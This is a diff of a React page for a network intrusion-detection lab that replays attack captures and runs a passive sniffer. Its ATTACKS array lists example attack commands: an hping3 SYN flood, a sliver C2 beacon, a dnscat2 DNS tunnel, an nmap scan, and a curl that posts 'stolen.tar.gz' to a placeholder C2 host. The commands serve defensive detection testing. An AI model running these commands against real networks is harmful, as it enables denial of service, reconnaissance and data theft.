@@ -1,48 +1,63 @@
 'use client'
-import { useState, useEffect } from 'react'
-import { Skull, Target, Zap, Activity, Wifi, Radio, Upload, Play, CheckCircle2, Shield, RefreshCw, HelpCircle, BookOpen, Terminal, ChevronDown, ChevronUp, Lock, Cpu, FileCode, Server, Network } from 'lucide-react'
+
+import React, { useState, useEffect } from 'react'
+import { 
+  Skull, Target, Zap, Activity, Wifi, Radio, Upload, Play, 
+  CheckCircle2, Shield, RefreshCw, HelpCircle, BookOpen, Terminal, 
+  ChevronDown, ChevronUp, Lock, Cpu, FileCode, Server, Network, 
+  Copy, Check, FileUp, Pause
+} from 'lucide-react'
 import PacketFlowCanvas from '@/components/PacketFlowCanvas'
+import { Card, CardHeader, CardTitle, CardContent } from '@/components/ui/Card'
+import { Badge, BadgeVariant } from '@/components/ui/Badge'
+import { Button } from '@/components/ui/Button'
 
 const ATTACKS = [
   {
-    type: 'uni_directional', name: 'Volumetric SYN Flood (DDoS)', vector: 'VECTOR (a)', metric: 'SYN Asymmetry Ratio (R -> inf)', icon: Wifi, color: 'red',
-    kali: 'hping3 -S -p 80 --flood',
+    type: 'uni_directional', name: 'Volumetric SYN Flood (DDoS)', vector: 'VECTOR (a)', metric: 'SYN Asymmetry Ratio (R → inf)', icon: Wifi,
+    kali: 'hping3 -S -p 80 --flood 10.0.1.50',
     desc: 'Fires high-rate simplex SYN packets to blackholed targets with 0 SYN-ACK return packets.',
+    variant: 'critical' as BadgeVariant
   },
   {
-    type: 'c2_beacon', name: 'Botnet C2 Periodic Beaconing', vector: 'VECTOR (b)', metric: 'IAT Periodicity CV < 0.5', icon: Activity, color: 'purple',
+    type: 'c2_beacon', name: 'Botnet C2 Periodic Beaconing', vector: 'VECTOR (b)', metric: 'IAT Periodicity CV < 0.5', icon: Activity,
     kali: 'sliver-client beacon --interval 10s',
     desc: 'Generates robotic periodic heartbeats with low Inter-Arrival Time variation (CV < 0.5).',
+    variant: 'warning' as BadgeVariant
   },
   {
-    type: 'dns_tunnel', name: 'Covert DGA & DNS Tunnelling', vector: 'VECTOR (c)', metric: 'Shannon Entropy H > 3.8', icon: Network, color: 'blue',
+    type: 'dns_tunnel', name: 'Covert DGA & DNS Tunnelling', vector: 'VECTOR (c)', metric: 'Shannon Entropy H > 3.8', icon: Network,
     kali: 'dnscat2 --dns domain=exfil.covert.lab',
     desc: 'Transmits high-entropy domain queries to test covert channel and DGA detection over gateway.',
+    variant: 'info' as BadgeVariant
   },
   {
-    type: 'tls_anomaly', name: 'Encrypted Session Malware', vector: 'VECTOR (d)', metric: 'Zero-Decryption JA3/JA4 Hash', icon: Lock, color: 'cyan',
+    type: 'tls_anomaly', name: 'Encrypted Session Malware', vector: 'VECTOR (d)', metric: 'Zero-Decryption JA3/JA4 Hash', icon: Lock,
     kali: 'curl -k --tls-max 1.2 https://target:8443',
     desc: 'Transmits TLS ClientHello frames with abnormal cipher metadata without payload decryption.',
+    variant: 'neutral' as BadgeVariant
   },
   {
-    type: 'port_scan', name: 'Simplex Reconnaissance Scan', vector: 'VECTOR (e)', metric: 'Port Fan-Out Cardinality > 20', icon: Target, color: 'orange',
-    kali: 'nmap -sS -Pn -p 1-150',
+    type: 'port_scan', name: 'Simplex Reconnaissance Scan', vector: 'VECTOR (e)', metric: 'Port Fan-Out Cardinality > 20', icon: Target,
+    kali: 'nmap -sS -Pn -p 1-150 10.0.1.99',
     desc: 'Simulates rapid sequential port probing (1-150) across simplex tap without waiting for handshakes.',
+    variant: 'warning' as BadgeVariant
   },
   {
-    type: 'exfiltration', name: 'Asymmetric Data Exfiltration', vector: 'VECTOR (f)', metric: 'Directional Volume Ratio > 10:1', icon: Skull, color: 'rose',
+    type: 'exfiltration', name: 'Asymmetric Data Exfiltration', vector: 'VECTOR (f)', metric: 'Directional Volume Ratio > 10:1', icon: Skull,
     kali: 'curl -X POST -d @stolen.tar.gz http://c2:9000',
     desc: 'Fires bulk outbound payload bursts with large volume asymmetry and zero return ACKs.',
+    variant: 'critical' as BadgeVariant
   },
 ]
 
 const PCAP_SAMPLES = [
-  { name: 'syn_flood.pcap', label: 'Volumetric SYN Flood', category: 'SIMPLEX_DDOS', size: '55.9 KB' },
-  { name: 'real_port_scan.pcap', label: 'Real Port Scan', category: 'PORT_SCAN', size: '2.8 KB' },
-  { name: 'dns_tunnel.pcap', label: 'DNS Covert Tunnel', category: 'DNS_EXFILTRATION', size: '3.1 KB' },
-  { name: 'rigid_beacon.pcap', label: 'C2 Rigid Heartbeat', category: 'C2_BEACON', size: '764 B' },
-  { name: 'udp_flood.pcap', label: 'UDP Simplex Flood', category: 'SIMPLEX_DDOS', size: '543 KB' },
-  { name: 'stealth_scan.pcap', label: 'Stealth Slow Scan', category: 'PORT_SCAN', size: '2.8 KB' },
+  { name: 'syn_flood.pcap', label: 'Volumetric SYN Flood', category: 'VECTOR_A', size: '55.9 KB' },
+  { name: 'real_port_scan.pcap', label: 'Real Port Scan', category: 'VECTOR_E', size: '2.8 KB' },
+  { name: 'dns_tunnel.pcap', label: 'DNS Covert Tunnel', category: 'VECTOR_C', size: '3.1 KB' },
+  { name: 'rigid_beacon.pcap', label: 'C2 Rigid Heartbeat', category: 'VECTOR_B', size: '764 B' },
+  { name: 'udp_flood.pcap', label: 'UDP Simplex Flood', category: 'VECTOR_A', size: '543 KB' },
+  { name: 'stealth_scan.pcap', label: 'Stealth Slow Scan', category: 'VECTOR_E', size: '2.8 KB' },
 ]
 
 export default function ActionCenterPage() {
@@ -52,6 +67,7 @@ export default function ActionCenterPage() {
   const [uploading, setUploading] = useState(false)
   const [isExplainerOpen, setIsExplainerOpen] = useState(false)
   const [explainerTab, setExplainerTab] = useState<'pcap' | 'visualizer' | 'sniffer'>('pcap')
+  const [copiedCmd, setCopiedCmd] = useState<string | null>(null)
 
   const fetchSniffer = async () => {
     try {
@@ -71,12 +87,12 @@ export default function ActionCenterPage() {
     try {
       const res = await fetch(`http://localhost:8000/api/simulate/${type}`, { method: 'POST' })
       if (res.ok) {
-        setResults(prev => [{ type: 'success', msg: `${type.replace(/_/g, ' ').toUpperCase()} triggered. Raw packets transmitted on wire. Check Live Threats.`, attack: type }, ...prev].slice(0, 8))
+        setResults(prev => [{ type: 'success', msg: `${type.replace(/_/g, ' ').toUpperCase()} triggered. Raw packets transmitted on wire. Check Live Stream.`, attack: type }, ...prev].slice(0, 6))
       } else {
-        setResults(prev => [{ type: 'error', msg: `Failed: ${res.statusText}`, attack: type }, ...prev].slice(0, 8))
+        setResults(prev => [{ type: 'error', msg: `Failed: ${res.statusText}`, attack: type }, ...prev].slice(0, 6))
       }
     } catch {
-      setResults(prev => [{ type: 'error', msg: 'Network error reaching backend.', attack: type }, ...prev].slice(0, 8))
+      setResults(prev => [{ type: 'error', msg: 'Network error reaching backend gateway.', attack: type }, ...prev].slice(0, 6))
     } finally {
       setLoading(null)
     }
@@ -87,12 +103,12 @@ export default function ActionCenterPage() {
     try {
       const res = await fetch(`http://localhost:8000/api/network/pcap/replay/${sampleName}`, { method: 'POST' })
       if (res.ok) {
-        setResults(prev => [{ type: 'success', msg: `PCAP Replay Started: ${sampleName}. Genuine raw packet stream entering Scapy/Zeek pipeline.`, attack: sampleName }, ...prev].slice(0, 8))
+        setResults(prev => [{ type: 'success', msg: `PCAP Replay Started: ${sampleName}. Genuine raw packet stream entering Scapy/Zeek pipeline.`, attack: sampleName }, ...prev].slice(0, 6))
       } else {
-        setResults(prev => [{ type: 'error', msg: `Failed replaying ${sampleName}: ${res.statusText}`, attack: sampleName }, ...prev].slice(0, 8))
+        setResults(prev => [{ type: 'error', msg: `Failed replaying ${sampleName}: ${res.statusText}`, attack: sampleName }, ...prev].slice(0, 6))
       }
     } catch {
-      setResults(prev => [{ type: 'error', msg: 'Network error reaching backend.', attack: sampleName }, ...prev].slice(0, 8))
+      setResults(prev => [{ type: 'error', msg: 'Network error reaching backend.', attack: sampleName }, ...prev].slice(0, 6))
     } finally {
       setLoading(null)
     }
@@ -131,7 +147,7 @@ export default function ActionCenterPage() {
       })
       if (res.ok) {
         const data = await res.json()
-        setResults(prev => [{ type: 'success', msg: `Custom PCAP Uploaded (${data.filename} - ${data.size_bytes} bytes). Processing through ML engine...`, attack: file.name }, ...prev])
+        setResults(prev => [{ type: 'success', msg: `Custom PCAP Uploaded (${data.filename} - ${data.size_bytes} bytes). Processing through ML pipeline...`, attack: file.name }, ...prev])
       } else {
         setResults(prev => [{ type: 'error', msg: `Upload failed: ${res.statusText}`, attack: file.name }, ...prev])
       }
@@ -143,292 +159,316 @@ export default function ActionCenterPage() {
     }
   }
 
+  const copyKaliCmd = (cmd: string) => {
+    navigator.clipboard.writeText(cmd)
+    setCopiedCmd(cmd)
+    setTimeout(() => setCopiedCmd(null), 2000)
+  }
+
   return (
-    <div className="space-y-6 max-w-[1400px] animate-in fade-in duration-500 p-6">
-      <div className="flex flex-col sm:flex-row justify-between sm:items-start gap-4">
+    <div className="space-y-6 max-w-[1500px] mx-auto animate-in fade-in duration-300 font-mono">
+      {/* PAGE HEADER */}
+      <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4 border-b border-white/[0.06] pb-4">
         <div>
-          <h2 className="text-2xl font-bold tracking-tight text-white flex items-center gap-3">
-            <Radio className="w-6 h-6 text-blue-500 animate-pulse" />
+          <h1 className="text-base font-bold tracking-tight text-white font-mono uppercase flex items-center gap-2">
+            <Skull className="w-4 h-4 text-red-400" />
             NTRO Unidirectional Traffic Replay & Ingestion Lab
-          </h2>
-          <p className="text-sm text-slate-400 mt-1">
+          </h1>
+          <p className="text-xs text-zinc-400 mt-0.5">
             Replay authentic defense PCAPs, manage passive line-rate network sniffing, or inject raw socket attack streams across the data diode tap.
           </p>
         </div>
-        <button
+
+        <Button
+          variant="outline"
+          size="sm"
           onClick={() => setIsExplainerOpen(!isExplainerOpen)}
-          className="px-3.5 py-2 rounded-lg bg-blue-600/10 border border-blue-500/30 hover:bg-blue-600/20 text-blue-400 text-xs font-bold flex items-center gap-2 transition-all shrink-0 self-start shadow-sm"
+          icon={<BookOpen className="w-3.5 h-3.5 text-blue-400" />}
         >
-          <HelpCircle className="w-4 h-4" />
-          {isExplainerOpen ? 'Hide Architecture Guide' : 'How These Systems Work (NTRO Architecture)'}
-          {isExplainerOpen ? <ChevronUp className="w-3.5 h-3.5" /> : <ChevronDown className="w-3.5 h-3.5" />}
-        </button>
+          {isExplainerOpen ? 'Hide Architecture Guide' : 'Architecture & Physics Guide'}
+        </Button>
       </div>
 
       {/* ARCHITECTURE & PHYSICS EXPLAINER DRAWER */}
       {isExplainerOpen && (
-        <div className="rounded-xl border border-blue-500/30 bg-[#0d121f] p-5 space-y-4 animate-in fade-in duration-300 font-mono text-xs">
-          <div className="flex flex-wrap items-center justify-between gap-3 border-b border-slate-800 pb-3">
-            <div className="flex items-center gap-2 text-white font-bold text-sm">
+        <Card className="border-blue-500/20 bg-[#0e121b]">
+          <CardHeader className="py-3 px-4 flex-row justify-between items-center space-y-0">
+            <div className="flex items-center gap-2 text-xs font-bold text-zinc-200">
               <BookOpen className="w-4 h-4 text-blue-400" />
-              NTRO PS #26145 System Architecture & Optical Diode Physics Reference
+              <span>NTRO PS #26145 System Architecture & Optical Diode Physics Reference</span>
             </div>
-            <div className="flex rounded-lg bg-slate-900 p-1 border border-slate-800">
-              <button
-                onClick={() => setExplainerTab('pcap')}
-                className={`px-3 py-1 rounded text-xs font-bold transition-all ${explainerTab === 'pcap' ? 'bg-blue-600 text-white shadow' : 'text-slate-400 hover:text-white'}`}
-              >
-                1. Authentic PCAP Replay
-              </button>
-              <button
-                onClick={() => setExplainerTab('visualizer')}
-                className={`px-3 py-1 rounded text-xs font-bold transition-all ${explainerTab === 'visualizer' ? 'bg-blue-600 text-white shadow' : 'text-slate-400 hover:text-white'}`}
-              >
-                2. Diode Packet Visualizer
-              </button>
-              <button
-                onClick={() => setExplainerTab('sniffer')}
-                className={`px-3 py-1 rounded text-xs font-bold transition-all ${explainerTab === 'sniffer' ? 'bg-blue-600 text-white shadow' : 'text-slate-400 hover:text-white'}`}
-              >
-                3. Passive Live Sniffer
-              </button>
+            <div className="flex p-0.5 bg-[#090a0d] border border-white/[0.08] rounded">
+              {(['pcap', 'visualizer', 'sniffer'] as const).map((tab) => (
+                <button
+                  key={tab}
+                  onClick={() => setExplainerTab(tab)}
+                  className={`px-2.5 py-1 rounded text-[11px] font-mono transition-all cursor-pointer ${
+                    explainerTab === tab
+                      ? 'bg-blue-600/30 text-blue-300 font-semibold border border-blue-500/40'
+                      : 'text-zinc-400 hover:text-zinc-200'
+                  }`}
+                >
+                  {tab === 'pcap' ? '1. PCAP Replay' : tab === 'visualizer' ? '2. Diode Visualizer' : '3. Live Sniffer'}
+                </button>
+              ))}
             </div>
-          </div>
-
-          {/* TAB 1: PCAP REPLAY */}
-          {explainerTab === 'pcap' && (
-            <div className="space-y-3">
+          </CardHeader>
+          <CardContent className="p-4 pt-2 text-xs space-y-3 font-sans">
+            {explainerTab === 'pcap' && (
               <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
-                <div className="bg-black/40 p-3 rounded border border-slate-800">
-                  <span className="text-slate-500 uppercase text-[10px] font-bold block">Disk Repository</span>
-                  <code className="text-blue-300 text-xs mt-1 block">data/pcaps/ (24 Samples)</code>
-                  <p className="text-slate-400 text-[11px] mt-1">Mounted into <code className="text-slate-300">cyberos-backend</code> at <code className="text-slate-300">/app/data/pcaps</code>.</p>
+                <div className="p-3 rounded bg-[#090b0e] border border-white/[0.06] space-y-1">
+                  <span className="text-[10px] font-mono text-zinc-500 uppercase block font-semibold">Disk Repository</span>
+                  <code className="text-blue-400 text-xs font-mono block">data/pcaps/ (24 Samples)</code>
+                  <p className="text-zinc-400 text-[11px] mt-1 leading-relaxed">Mounted into backend at <code className="text-zinc-300 font-mono">/app/data/pcaps</code> for native socket injection.</p>
                 </div>
-                <div className="bg-black/40 p-3 rounded border border-slate-800">
-                  <span className="text-slate-500 uppercase text-[10px] font-bold block">Execution Engine</span>
-                  <span className="text-green-400 font-bold text-xs mt-1 block">Scapy PcapReader Streaming</span>
-                  <p className="text-slate-400 text-[11px] mt-1">Iterates frame-by-frame with zero memory bloat, feeding sliding 5s tumbling windows.</p>
+                <div className="p-3 rounded bg-[#090b0e] border border-white/[0.06] space-y-1">
+                  <span className="text-[10px] font-mono text-zinc-500 uppercase block font-semibold">Streaming Engine</span>
+                  <span className="text-emerald-400 font-bold text-xs font-mono block">Scapy PcapReader Streaming</span>
+                  <p className="text-zinc-400 text-[11px] mt-1 leading-relaxed">Streams frame-by-frame into sliding 5s tumbling windows without buffer overflow.</p>
                 </div>
-                <div className="bg-black/40 p-3 rounded border border-slate-800">
-                  <span className="text-slate-500 uppercase text-[10px] font-bold block">Zero-Simulation Rule</span>
-                  <span className="text-orange-400 font-bold text-xs mt-1 block">Real Raw Wire Bytes</span>
-                  <p className="text-slate-400 text-[11px] mt-1">No fake random scores. Computes exact Shannon entropy H and real XGBoost/Isolation Forest inference.</p>
-                </div>
-              </div>
-              <div className="p-3 bg-slate-950/60 rounded border border-slate-800/80 text-[11px] text-slate-300 flex items-start gap-2">
-                <Terminal className="w-4 h-4 text-slate-500 shrink-0 mt-0.5" />
-                <div>
-                  <strong>How to trigger programmatically:</strong>
-                  <code className="bg-black px-2 py-0.5 rounded text-blue-300 border border-slate-800 ml-2">POST http://localhost:8000/api/network/pcap/replay/syn_flood.pcap</code>
+                <div className="p-3 rounded bg-[#090b0e] border border-white/[0.06] space-y-1">
+                  <span className="text-[10px] font-mono text-zinc-500 uppercase block font-semibold">Zero-Simulation Invariant</span>
+                  <span className="text-amber-400 font-bold text-xs font-mono block">Exact Wire Entropy & Timing</span>
+                  <p className="text-zinc-400 text-[11px] mt-1 leading-relaxed">Computes Shannon entropy $H$, IAT $CV$, and XGBoost v5 ML inference over raw payloads.</p>
                 </div>
               </div>
-            </div>
-          )}
-
-          {/* TAB 2: VISUALIZER */}
-          {explainerTab === 'visualizer' && (
-            <div className="space-y-3">
+            )}
+            {explainerTab === 'visualizer' && (
               <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
-                <div className="bg-black/40 p-3 rounded border border-slate-800">
-                  <span className="text-slate-500 uppercase text-[10px] font-bold block">Stage 1: Attacker WAN</span>
-                  <span className="text-red-400 font-bold text-xs mt-1 block">185.220.101.34 (Kali Tools)</span>
-                  <p className="text-slate-400 text-[11px] mt-1">Simulates adversary firing unidirectional packets (hping3, nmap, dnscat2) towards enclave.</p>
+                <div className="p-3 rounded bg-[#090b0e] border border-white/[0.06] space-y-1">
+                  <span className="text-[10px] font-mono text-zinc-500 uppercase block font-semibold">Stage 1: Attacker WAN</span>
+                  <span className="text-red-400 font-bold text-xs font-mono block">185.220.101.34 (Kali Tools)</span>
+                  <p className="text-zinc-400 text-[11px] mt-1 leading-relaxed">Adversary fires unidirectional packets (hping3, nmap, dnscat2) towards enclave.</p>
                 </div>
-                <div className="bg-black/40 p-3 rounded border border-slate-800">
-                  <span className="text-slate-500 uppercase text-[10px] font-bold block">Stage 2: Optical Tap</span>
-                  <span className="text-purple-400 font-bold text-xs mt-1 block">Simplex Light Conduit</span>
-                  <p className="text-slate-400 text-[11px] mt-1">Photons flow strictly Left-to-Right. Return fiber is physically absent: <strong>0 RETURN ACKs / 0 RSTs</strong>.</p>
+                <div className="p-3 rounded bg-[#090b0e] border border-white/[0.06] space-y-1">
+                  <span className="text-[10px] font-mono text-zinc-500 uppercase block font-semibold">Stage 2: Optical Tap</span>
+                  <span className="text-purple-400 font-bold text-xs font-mono block">Simplex Optical Barrier</span>
+                  <p className="text-zinc-400 text-[11px] mt-1 leading-relaxed">Photons flow strictly Left-to-Right. Return fiber physically absent: <strong>0 Return ACKs / 0 RSTs</strong>.</p>
                 </div>
-                <div className="bg-black/40 p-3 rounded border border-slate-800">
-                  <span className="text-slate-500 uppercase text-[10px] font-bold block">Stage 3: Sentinel Enclave</span>
-                  <span className="text-blue-400 font-bold text-xs mt-1 block">eth0 Sensor & Dual ML</span>
-                  <p className="text-slate-400 text-[11px] mt-1">Promiscuous RX extracts Shannon entropy H and IAT CV to detect anomalies without handshakes.</p>
-                </div>
-              </div>
-              <div className="p-3 bg-slate-950/60 rounded border border-slate-800/80 text-[11px] text-slate-300 flex items-start gap-2">
-                <Zap className="w-4 h-4 text-yellow-400 shrink-0 mt-0.5" />
-                <div>
-                  <strong>Live Stream Mechanics:</strong> The badge indicates an active WebSocket connection to <code className="text-green-300">ws://localhost:8000/ws/packet-stream</code> which broadcasts lightweight packet pulses at 60 FPS whenever packets traverse the diode.
+                <div className="p-3 rounded bg-[#090b0e] border border-white/[0.06] space-y-1">
+                  <span className="text-[10px] font-mono text-zinc-500 uppercase block font-semibold">Stage 3: Sentinel Enclave</span>
+                  <span className="text-emerald-400 font-bold text-xs font-mono block">Rx Sensor on eth0</span>
+                  <p className="text-zinc-400 text-[11px] mt-1 leading-relaxed">Receives light pulses, decodes L2-L4 headers, evaluates entropy and classifies threats.</p>
                 </div>
               </div>
-            </div>
-          )}
-
-          {/* TAB 3: LIVE SNIFFER */}
-          {explainerTab === 'sniffer' && (
-            <div className="space-y-3">
+            )}
+            {explainerTab === 'sniffer' && (
               <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
-                <div className="bg-black/40 p-3 rounded border border-slate-800">
-                  <span className="text-slate-500 uppercase text-[10px] font-bold block">Daemon Location</span>
-                  <code className="text-blue-300 text-xs mt-1 block">backend/ingestion/live_sniffer.py</code>
-                  <p className="text-slate-400 text-[11px] mt-1">Runs as an asynchronous daemon using Scapy's <code className="text-slate-300">AsyncSniffer</code>.</p>
+                <div className="p-3 rounded bg-[#090b0e] border border-white/[0.06] space-y-1">
+                  <span className="text-[10px] font-mono text-zinc-500 uppercase block font-semibold">Interface Binding</span>
+                  <code className="text-emerald-400 text-xs font-mono block">Promiscuous eth0 Socket</code>
+                  <p className="text-zinc-400 text-[11px] mt-1 leading-relaxed">Opens raw L2 AF_PACKET socket to capture all incoming unicast, multicast, and broadcast frames.</p>
                 </div>
-                <div className="bg-black/40 p-3 rounded border border-slate-800">
-                  <span className="text-slate-500 uppercase text-[10px] font-bold block">Interface & Privileges</span>
-                  <span className="text-green-400 font-bold text-xs mt-1 block">eth0 (NET_ADMIN, NET_RAW)</span>
-                  <p className="text-slate-400 text-[11px] mt-1">Promiscuous raw socket enabled in Docker Compose to capture all optical ingress traffic.</p>
+                <div className="p-3 rounded bg-[#090b0e] border border-white/[0.06] space-y-1">
+                  <span className="text-[10px] font-mono text-zinc-500 uppercase block font-semibold">Line-Rate Filtering</span>
+                  <span className="text-blue-400 font-bold text-xs font-mono block">In-Memory Scapy Parser</span>
+                  <p className="text-zinc-400 text-[11px] mt-1 leading-relaxed">Extracts inter-arrival intervals, port fan-outs, and domain query lengths with zero blocking.</p>
                 </div>
-                <div className="bg-black/40 p-3 rounded border border-slate-800">
-                  <span className="text-slate-500 uppercase text-[10px] font-bold block">100% Passive Guarantee</span>
-                  <span className="text-orange-400 font-bold text-xs mt-1 block">0 Outbound Transmissions</span>
-                  <p className="text-slate-400 text-[11px] mt-1">Strict read-only listening. Never injects SYN-ACKs, RSTs, or ICMP replies into the protected network.</p>
-                </div>
-              </div>
-              <div className="p-3 bg-slate-950/60 rounded border border-slate-800/80 text-[11px] text-slate-300 flex items-start gap-2">
-                <Server className="w-4 h-4 text-blue-400 shrink-0 mt-0.5" />
-                <div>
-                  <strong>Health Check API:</strong>
-                  <code className="bg-black px-2 py-0.5 rounded text-blue-300 border border-slate-800 ml-2">GET http://localhost:8000/api/network/sniffer/status</code>
+                <div className="p-3 rounded bg-[#090b0e] border border-white/[0.06] space-y-1">
+                  <span className="text-[10px] font-mono text-zinc-500 uppercase block font-semibold">Live Alert Broadcast</span>
+                  <span className="text-amber-400 font-bold text-xs font-mono block">WebSocket & Fast Event Bus</span>
+                  <p className="text-zinc-400 text-[11px] mt-1 leading-relaxed">Pushes detected anomalies to the live stream canvas and MongoDB incident ledger in real time.</p>
                 </div>
               </div>
+            )}
+          </CardContent>
+        </Card>
+      )}
+
+      {/* NOTIFICATION FEED */}
+      {results.length > 0 && (
+        <div className="space-y-1.5">
+          {results.map((r, i) => (
+            <div
+              key={i}
+              className={`p-2.5 rounded border text-xs font-mono flex items-center justify-between ${
+                r.type === 'success'
+                  ? 'bg-emerald-500/10 border-emerald-500/20 text-emerald-300'
+                  : 'bg-red-500/10 border-red-500/20 text-red-300'
+              }`}
+            >
+              <div className="flex items-center gap-2">
+                <span className={`w-1.5 h-1.5 rounded-full ${r.type === 'success' ? 'bg-emerald-400' : 'bg-red-400'}`} />
+                <span>{r.msg}</span>
+              </div>
+              <span className="text-[10px] text-zinc-500 uppercase">{r.attack}</span>
             </div>
-          )}
+          ))}
         </div>
       )}
 
-      {/* REAL-TIME SIMPLEX PACKET FLOW VISUALIZER */}
+      {/* REAL-TIME SIMPLEX CANVAS */}
       <PacketFlowCanvas />
 
-      {/* SNIFFER CONTROL PANEL */}
-      <div className="bg-[#111] border border-slate-800 p-5 rounded-xl flex flex-wrap items-center justify-between gap-4">
-        <div className="flex items-center gap-4">
-          <div className={`p-3 rounded-xl border ${snifferStats.is_running ? 'bg-green-500/10 border-green-500/30 text-green-400' : 'bg-slate-800/40 border-slate-700 text-slate-400'}`}>
-            <Radio className={`w-6 h-6 ${snifferStats.is_running ? 'animate-pulse' : ''}`} />
-          </div>
-          <div>
+      {/* SNIFFER & PCAP UPLOAD DUAL CONTROLS */}
+      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+        {/* Passive Sniffer Control Card */}
+        <Card>
+          <CardHeader className="py-3 px-4 flex-row justify-between items-center space-y-0">
             <div className="flex items-center gap-2">
-              <span className="text-sm font-bold text-white uppercase tracking-wider">Passive Live Network Sniffer</span>
-              <span className={`px-2 py-0.5 rounded text-[10px] font-bold ${snifferStats.is_running ? 'bg-green-500 text-black' : 'bg-slate-800 text-slate-300'}`}>
-                {snifferStats.is_running ? 'PROMISCUOUS RX ACTIVE' : 'STANDBY'}
-              </span>
+              <Terminal className="w-4 h-4 text-emerald-400" />
+              <CardTitle>Passive Line-Rate Network Sniffer</CardTitle>
             </div>
-            <div className="text-xs text-slate-400 mt-1 flex gap-4">
-              <span>Captured Packets: <strong className="text-white">{snifferStats.packets_captured}</strong></span>
-              <span>Captured Bytes: <strong className="text-white">{snifferStats.bytes_captured}</strong></span>
-              <span>Active Flows: <strong className="text-white">{snifferStats.active_flows_tracked}</strong></span>
-            </div>
-          </div>
-        </div>
-
-        <div className="flex items-center gap-3">
-          <button
-            onClick={toggleSniffer}
-            className={`px-4 py-2 rounded-lg text-xs font-bold transition-colors ${
-              snifferStats.is_running 
-                ? 'bg-red-600 hover:bg-red-700 text-white' 
-                : 'bg-blue-600 hover:bg-blue-700 text-white'
-            }`}
-          >
-            {snifferStats.is_running ? 'Stop Passive Capture' : 'Start Passive Interface Capture'}
-          </button>
-        </div>
-      </div>
-
-      {/* EXECUTION LOG */}
-      {results.length > 0 && (
-        <div className="space-y-2">
-          {results.slice(0, 3).map((r, i) => (
-            <div key={i} className={`p-3 rounded-md border text-xs font-mono flex items-center justify-between ${r.type === 'success' ? 'bg-green-500/10 border-green-500/20 text-green-400' : 'bg-red-500/10 border-red-500/20 text-red-400'}`}>
-              <span>{r.msg}</span>
-              <span className="text-[10px] text-slate-500">{new Date().toLocaleTimeString()}</span>
-            </div>
-          ))}
-        </div>
-      )}
-
-      {/* SECTION 1: GENUINE PCAP REPLAY LAB */}
-      <div className="space-y-3">
-        <div className="flex justify-between items-center border-b border-slate-800 pb-2">
-          <h3 className="text-sm font-bold tracking-wider text-slate-300 uppercase flex items-center gap-2">
-            <Play className="w-4 h-4 text-green-400" />
-            Authentic Attack PCAP Replay Pipeline (Zero-Simulation)
-          </h3>
-          <span className="text-xs text-slate-500">Real Scapy Parser &bull; Full Directional Feature Extraction</span>
-        </div>
-
-        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
-          {PCAP_SAMPLES.map((sample) => (
-            <div key={sample.name} className="bg-[#0c0f17] border border-slate-800 p-4 rounded-lg flex flex-col justify-between hover:border-slate-700 transition-colors">
-              <div>
-                <div className="flex justify-between items-start mb-2">
-                  <span className="px-2 py-0.5 bg-blue-500/10 border border-blue-500/20 text-blue-400 text-[10px] font-mono rounded">
-                    {sample.category}
-                  </span>
-                  <span className="text-[11px] text-slate-500 font-mono">{sample.size}</span>
-                </div>
-                <h4 className="text-sm font-semibold text-white font-mono">{sample.name}</h4>
-                <p className="text-xs text-slate-400 mt-1">{sample.label}</p>
+            <Badge variant={snifferStats.is_running ? 'secure' : 'neutral'} size="xs" dot>
+              {snifferStats.is_running ? 'SNIFFING ACTIVE' : 'STOPPED'}
+            </Badge>
+          </CardHeader>
+          <CardContent className="p-4 space-y-3">
+            <div className="grid grid-cols-3 gap-2 text-xs">
+              <div className="p-2.5 rounded bg-[#0d0f14] border border-white/[0.06]">
+                <span className="text-[10px] text-zinc-500 uppercase block font-semibold">Interface</span>
+                <span className="text-xs font-bold text-zinc-200 mt-0.5 block">{snifferStats.interface || 'eth0'}</span>
               </div>
-              <button
-                onClick={() => triggerPcapReplay(sample.name)}
-                disabled={loading !== null}
-                className="mt-4 w-full py-1.5 bg-slate-800 hover:bg-blue-600 disabled:opacity-50 text-white rounded text-xs font-semibold font-mono transition-colors flex items-center justify-center gap-1.5"
-              >
-                {loading === sample.name ? <RefreshCw className="w-3.5 h-3.5 animate-spin" /> : <Play className="w-3.5 h-3.5" />}
-                Replay Raw PCAP
-              </button>
+              <div className="p-2.5 rounded bg-[#0d0f14] border border-white/[0.06]">
+                <span className="text-[10px] text-zinc-500 uppercase block font-semibold">Packets</span>
+                <span className="text-xs font-bold text-blue-400 mt-0.5 block">{snifferStats.packets_captured || 0}</span>
+              </div>
+              <div className="p-2.5 rounded bg-[#0d0f14] border border-white/[0.06]">
+                <span className="text-[10px] text-zinc-500 uppercase block font-semibold">Bytes Captured</span>
+                <span className="text-xs font-bold text-emerald-400 mt-0.5 block">
+                  {Math.round((snifferStats.bytes_captured || 0) / 1024)} KB
+                </span>
+              </div>
             </div>
-          ))}
-        </div>
+
+            <Button
+              variant={snifferStats.is_running ? 'danger' : 'primary'}
+              size="sm"
+              className="w-full"
+              onClick={toggleSniffer}
+              icon={snifferStats.is_running ? <Pause className="w-3.5 h-3.5" /> : <Play className="w-3.5 h-3.5" />}
+            >
+              {snifferStats.is_running ? 'Stop Line-Rate Sniffer' : 'Start Promiscuous Line-Rate Sniffer (eth0)'}
+            </Button>
+          </CardContent>
+        </Card>
+
+        {/* Custom PCAP Upload Dropzone */}
+        <Card>
+          <CardHeader className="py-3 px-4">
+            <div className="flex items-center gap-2">
+              <Upload className="w-4 h-4 text-blue-400" />
+              <CardTitle>Ingest External PCAP Capture File</CardTitle>
+            </div>
+          </CardHeader>
+          <CardContent className="p-4 space-y-3">
+            <label className="border-2 border-dashed border-white/[0.12] hover:border-blue-500/50 rounded-lg p-5 flex flex-col items-center justify-center cursor-pointer transition-colors bg-[#0d0f14]/50">
+              <FileUp className="w-6 h-6 text-zinc-500 mb-2" />
+              <span className="text-xs font-medium text-zinc-300">
+                {uploading ? 'Processing capture file...' : 'Drop PCAP file here or browse disk'}
+              </span>
+              <span className="text-[10px] text-zinc-500 mt-1">Accepts standard .pcap or .pcapng files up to 500 MB</span>
+              <input
+                type="file"
+                accept=".pcap,.pcapng"
+                onChange={handleFileUpload}
+                disabled={uploading}
+                className="hidden"
+              />
+            </label>
+          </CardContent>
+        </Card>
       </div>
 
